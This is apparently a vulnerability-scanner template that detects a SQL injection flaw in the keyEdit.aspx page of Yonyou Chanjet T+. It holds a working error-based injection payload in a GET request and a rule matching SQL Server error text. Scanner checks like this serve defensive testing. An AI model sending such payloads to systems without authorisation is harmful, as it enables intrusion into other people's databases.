id: yonyou-chanjet-tplus-keyedit-sqli

info:
  name: 用友 畅捷通T+ keyEdit SQL注入漏洞
  author: k5rC85Lma
  severity: high
  verified: true
  reference:
    - https://mp.weixin.qq.com/s/GQB8EUyh9bqBouCwwkfluQ
  tags: yonyou,chanjet,sqli
  created: 2026/01/27
  requires: [chanjet]
  requires-mode: opportunistic

rules:
  r0:
    request:
      method: GET
      path: /tplus/UFAQD/keyEdit.aspx?KeyID=1%27%20and%201=(select%20@@version)%20--&preload=1
    expression: |
      response.body.bcontains(b'nvarchar') &&
      response.body.bcontains(b'Microsoft SQL Server')
expression: r0()
